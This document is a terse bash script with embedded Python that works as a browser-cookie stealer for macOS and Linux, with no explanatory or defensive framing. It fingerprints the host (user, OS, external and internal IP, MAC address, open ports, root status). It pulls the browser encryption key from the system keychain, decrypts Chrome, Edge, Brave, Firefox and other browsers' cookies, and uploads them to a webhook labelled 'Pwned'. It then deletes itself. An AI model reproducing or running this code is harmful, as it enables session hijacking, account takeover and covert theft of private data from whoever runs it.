#!/bin/bash
w="$DC";[ -z "$w" ]&&exit 0
m=false;[ "$(uname -s)" = "Darwin" ]&&m=true
h="$(hostname 2>/dev/null||echo ?)";u="$(whoami 2>/dev/null||echo ?)";kv="$(uname -srm 2>/dev/null||echo ?)"
if $m;then ov="$(sw_vers -productName 2>/dev/null) $(sw_vers -productVersion 2>/dev/null)";else ov="$(grep PRETTY_NAME /etc/os-release 2>/dev/null|cut -d'"' -f2)";[ -z "$ov" ]&&ov="$kv";fi
ei="$(curl -fsSL --max-time 5 https://api.ipify.org 2>/dev/null||echo ?)";rt=false;[ "$(id -u)" = "0" ]&&rt=true
if $m;then li="$(ipconfig getifaddr en0 2>/dev/null||echo ?)";ma="$(ifconfig en0 2>/dev/null|awk '/ether/{print $2}')";else li="$(hostname -I 2>/dev/null|awk '{print $1}')";[ -z "$li" ]&&li="?";ma="$(ip link 2>/dev/null|grep -A1 'state UP'|awk '/link\/ether/{print $2}'|head -1)";fi
[ -z "$ma" ]&&ma="?";pt="$(ss -tlnp 2>/dev/null|awk 'NR>1{print $4}'|grep -o '[0-9]*$'|sort -un|head -25|tr '\n' ','|sed 's/,$//')";[ -z "$pt" ]&&pt="?"
bt="";cp="";fp=""
ck(){[ -d "$2" ]&&eval "$1=\"\$$1|$3=$2\""&&bt="$bt\n\`[$4] $3\`";}
if $m;then L="$HOME/Library/Application Support"
ck cp "$L/Google/Chrome" Chrome Chromium;ck cp "$L/Microsoft Edge" Edge Chromium;ck cp "$L/BraveSoftware/Brave-Browser" Brave Chromium;ck cp "$L/Vivaldi" Vivaldi Chromium;ck cp "$L/com.operasoftware.Opera" Opera Chromium
ck fp "$L/Firefox/Profiles" Firefox Firefox;ck fp "$L/zen/Profiles" Zen Firefox
else ck cp "$HOME/.config/google-chrome" Chrome Chromium;ck cp "$HOME/.config/microsoft-edge" Edge Chromium;ck cp "$HOME/.config/BraveSoftware/Brave-Browser" Brave Chromium;ck cp "$HOME/.config/vivaldi" Vivaldi Chromium;ck cp "$HOME/.config/opera" Opera Chromium;ck cp "$HOME/.config/chromium" Chromium Chromium
ck fp "$HOME/.mozilla/firefox" Firefox Firefox;ck fp "$HOME/.zen" Zen Firefox;ck fp "$HOME/.waterfox" Waterfox Firefox;ck fp "$HOME/.librewolf" LibreWolf Firefox;fi
[ -z "$bt" ]&&bt="None"
e1="{\"title\":\"${u}@${h}\",\"color\":16711680,\"fields\":[{\"name\":\"OS\",\"value\":\"\`${ov}\`\",\"inline\":true},{\"name\":\"Kernel\",\"value\":\"\`${kv}\`\",\"inline\":true},{\"name\":\"Root\",\"value\":\"\`${rt}\`\",\"inline\":true},{\"name\":\"Ext IP\",\"value\":\"\`${ei}\`\",\"inline\":true},{\"name\":\"Int IP\",\"value\":\"\`${li}\`\",\"inline\":true},{\"name\":\"MAC\",\"value\":\"\`${ma}\`\",\"inline\":true},{\"name\":\"Ports\",\"value\":\"\`${pt}\`\",\"inline\":false},{\"name\":\"Browsers\",\"value\":\"${bt}\",\"inline\":false}]}"
td="/tmp/.c$(head -c 6 /dev/urandom|od -An -tx1|tr -d ' \n')";mkdir -p "$td";tc=0;cs=""
PY='
import sys,os,json,sqlite3,shutil,tempfile,hashlib
def dk_linux(p):
 try:
  import secretstorage as ss;b=ss.dbus_init();c=ss.get_default_collection(b)
  if c.is_locked():c.unlock()
  for i in c.get_all_items():
   if"Chrome"in i.get_label()or"Chromium"in i.get_label():return i.get_secret()
 except:pass
 return b"peanuts"
def dk_mac(n):
 import subprocess;m={"Chrome":"Chrome Safe Storage","Edge":"Microsoft Edge Safe Storage","Brave":"Brave Safe Storage","Vivaldi":"Vivaldi Safe Storage","Opera":"Opera Safe Storage","Chromium":"Chromium Safe Storage"}
 try:
  r=subprocess.run(["security","find-generic-password","-s",m.get(n,n+" Safe Storage"),"-w"],capture_output=True,text=True,timeout=10)
  if r.returncode==0:return r.stdout.strip().encode()
 except:pass
def dv(e,k,mc):
 if not e or len(e)<4:return""
 if e[:3]in(b"v10",b"v11"):
  try:
   from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes;from cryptography.hazmat.backends import default_backend
   d=hashlib.pbkdf2_hmac("sha1",k,b"saltysalt",1003 if mc else 1,dklen=16);ci=Cipher(algorithms.AES(d),modes.CBC(b" "*16),backend=default_backend()).decryptor();r=ci.update(e[3:])+ci.finalize();p=r[-1]
   if 0<p<=16:r=r[:-p]
   return r.decode("utf-8",errors="ignore")
  except:return""
 return""
mc=sys.platform=="darwin";n=sys.argv[1];p=sys.argv[2];k=dk_mac(n)if mc else dk_linux(p)
if not k:sys.exit(0)
ck=[]
for r,_,fs in os.walk(p):
 for f in fs:
  if f=="Cookies":
   t=tempfile.mktemp(suffix=".db")
   try:shutil.copy2(os.path.join(r,f),t);c=sqlite3.connect(t);[(lambda h,nm,e,pt:ck.append({"domain":h,"name":nm,"value":v,"path":pt})if(v:=dv(e,k,mc))else None)(*row)for row in c.execute("SELECT host_key,name,encrypted_value,path FROM cookies")];c.close()
   except:pass
   finally:
    try:os.unlink(t)
    except:pass
print(json.dumps(ck))'
IFS='|';for x in $cp;do [ -z "$x" ]&&continue;bn="${x%%=*}";bp="${x#*=}"
r="$(printf '%s' "$PY"|python3 - "$bn" "$bp" 2>/dev/null)";[ -z "$r" -o "$r" = "[]" ]&&continue
c="$(printf '%s' "$r"|python3 -c 'import json,sys;print(len(json.load(sys.stdin)))' 2>/dev/null)";[ -z "$c" -o "$c" = "0" ]&&continue
tc=$((tc+c));cs="${cs}**${bn}**: ${c} cookies\n";printf '%s' "$r">"$td/${bn}_cookies.json";done
for x in $fp;do [ -z "$x" ]&&continue;bn="${x%%=*}";bp="${x#*=}";j="[";c=0
for d in "$bp"/*/;do [ ! -f "$d/cookies.sqlite" ]&&continue;t="$td/fx$RANDOM.db";cp "$d/cookies.sqlite" "$t" 2>/dev/null||continue
while IFS='|' read -r a b v p;do [ -z "$b" ]&&continue;v="$(printf '%s' "$v"|sed 's/\\/\\\\/g;s/"/\\"/g')";[ "$j" != "[" ]&&j="$j,";j="$j{\"domain\":\"$a\",\"name\":\"$b\",\"value\":\"$v\",\"path\":\"$p\"}";c=$((c+1));done<<< "$(sqlite3 "$t" 'SELECT host,name,value,path FROM moz_cookies' 2>/dev/null)";rm -f "$t";done
[ $c -gt 0 ]&&j="$j]"&&tc=$((tc+c))&&cs="${cs}**${bn}**: ${c} cookies\n"&&printf '%s' "$j">"$td/${bn}_cookies.json";done;unset IFS
[ -z "$cs" ]&&cs="No cookies found"
e2="{\"title\":\"Browser Cookies (${tc} total)\",\"color\":15105570,\"description\":\"${cs}\",\"footer\":{\"text\":\"$(date '+%Y-%m-%d %H:%M:%S')\"}}"
curl -fsS -X POST "$w" -H "Content-Type: application/json" -d "{\"embeds\":[$e1,$e2],\"username\":\"Pwned\"}" >/dev/null 2>&1
for f in "$td"/*_cookies.json;do [ ! -f "$f" ]&&continue;fn="$(basename "$f")";lb="${fn%_cookies.json}";fc="$(python3 -c "import json;print(len(json.load(open('$f'))))" 2>/dev/null||echo '?')"
b="----$(head -c 8 /dev/urandom|od -An -tx1|tr -d ' \n')";pj="{\"username\":\"Pwned\",\"content\":\"Cookies: **${lb}** (${fc})\"}"
{ printf -- "--%s\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/json\r\n\r\n" "$b" "$pj" "$b" "$fn";cat "$f";printf "\r\n--%s--\r\n" "$b";} >"$td/u"
curl -fsS -X POST "$w" -H "Content-Type: multipart/form-data; boundary=$b" --data-binary "@$td/u" >/dev/null 2>&1;done
rm -rf "$td" 2>/dev/null;rm -f "$0" 2>/dev/null
